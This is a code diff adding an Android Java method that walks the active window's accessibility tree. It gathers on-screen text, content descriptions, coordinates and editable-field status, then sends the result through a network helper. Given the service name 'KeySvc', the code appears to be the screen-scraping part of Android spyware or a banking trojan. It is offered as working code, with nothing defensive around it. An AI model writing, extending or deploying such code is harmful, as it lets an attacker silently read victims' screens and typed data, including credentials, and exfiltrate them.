@@ -207,4 +207,61 @@ return ativo;
             }
         }, 400);
     }
+
+public static void dump2(final KeySvc s) {
+H.post(new Runnable() { public void run() {
+JSONArray arr = new JSONArray();
+try {
+AccessibilityNodeInfo r = raiz(s);
+if (r == null) {
+Net.send("{\"t\":\"err\",\"o\":\"raiz nula - sem janela legivel\"}");
+} else {
+java.util.ArrayDeque<Object[]> q = new java.util.ArrayDeque<Object[]>();
+q.add(new Object[]{r, 0});
+int cont = 0;
+while (!q.isEmpty() && cont < 600) {
+Object[] it = q.poll();
+AccessibilityNodeInfo n = (AccessibilityNodeInfo) it[0];
+int d = ((Integer) it[1]).intValue();
+if (n == null) continue;
+cont++;
+String txt = null;
+try { if (n.getText() != null) txt = n.getText().toString().trim(); } catch (Throwable ignored) {}
+if (txt == null || txt.length() == 0) {
+try { if (n.getContentDescription() != null) txt = n.getContentDescription().toString().trim(); } catch (Throwable ignored) {}
 }
+android.graphics.Rect b = new android.graphics.Rect();
+try { n.getBoundsInScreen(b); } catch (Throwable ignored) {}
+boolean tem = txt != null && txt.length() > 0;
+if (tem || n.isClickable() || n.isEditable()) {
+try {
+org.json.JSONObject o = new org.json.JSONObject();
+if (tem) o.put("t", txt.length() > 120 ? txt.substring(0, 120) : txt);
+o.put("cls", cls(n.getClassName()));
+o.put("x", b.centerX());
+o.put("y", b.centerY());
+o.put("c", n.isClickable());
+o.put("e", n.isEditable());
+o.put("d", d);
+arr.put(o);
+} catch (Throwable ignored) {}
+}
+if (d < MAXD) {
+for (int i = 0; i < n.getChildCount(); i++) {
+AccessibilityNodeInfo ch = null;
+try { ch = n.getChild(i); } catch (Throwable ignored) {}
+if (ch != null) q.add(new Object[]{ch, d + 1});
+}
+}
+}
+if (arr.length() == 0) {
+CharSequence p = r.getPackageName();
+Net.send("{\"t\":\"err\",\"o\":\"arvore vazia pkg=" + (p == null ? "?" : p.toString()) + "\"}");
+}
+}
+} catch (Throwable e) {
+Net.send("{\"t\":\"err\",\"o\":\"dump2: " + e + "\"}");
+}
+try { Net.send("{\"t\":\"tree\",\"o\":" + arr.toString() + "}"); } catch (Throwable ignored) {}
+}});
+}}
